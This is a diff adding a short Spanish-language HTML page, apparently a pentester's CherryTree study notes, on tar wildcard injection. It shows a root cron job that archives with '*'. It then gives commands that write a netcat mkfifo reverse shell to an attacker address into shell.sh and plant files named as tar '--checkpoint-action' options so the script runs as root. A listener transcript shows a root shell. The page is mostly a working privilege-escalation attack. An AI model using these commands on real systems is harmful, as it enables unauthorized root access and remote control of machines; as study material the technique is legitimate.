@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Wildcards</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Wildcards</h1><br/>Los wildcards son caracteres que representan un conjunto o rango.  Con ellos se construyen las expresiones regulares. Suelen denominarse también caracteres comodín<br /><br /><strong><span style="text-decoration:underline;">TAR WILDCARD</span></strong><br /><br />Si tenemos un cron que realize lo siguiente podremos usar un wildcard para tar<br /><br /><div class="codebox"><div class="codebox">cd&nbsp;/var/log/mon&nbsp;&amp;&amp;&nbsp;tar&nbsp;-zcf&nbsp;/tmp/mon.tar.gz&nbsp;*</div></div><br /><br />Si queremos crear una <strong>REVERSE SHELL</strong> hariamos lo siguiente en el directorio donde el cron hace el tar.gz y con nuestra maquina atacante escuchando nos conectariamos<br /><br /><div class="codebox"><div class="codebox">root@box$&nbsp;cd&nbsp;/var/log/mon<br />root@box$&nbsp;echo&nbsp;&quot;rm&nbsp;/tmp/f;mkfifo&nbsp;/tmp/f;cat&nbsp;/tmp/f|/bin/sh&nbsp;-i&nbsp;2&gt;&amp;1|nc&nbsp;10.0.0.1&nbsp;1234&nbsp;&gt;/tmp/f&quot;&nbsp;&gt;&nbsp;shell.sh<br />echo&nbsp;&quot;&quot;&nbsp;&gt;&nbsp;&quot;--checkpoint-action=exec=sh&nbsp;shell.sh&quot;<br />echo&nbsp;&quot;&quot;&nbsp;&gt;&nbsp;--checkpoint=1</div></div><br /><br /><div class="codebox"><div class="codebox">user@box$&nbsp;nc&nbsp;-lvnp&nbsp;1234<br />#&nbsp;id<br />uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)</div></div><br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a></div>
+</body>
+</html>
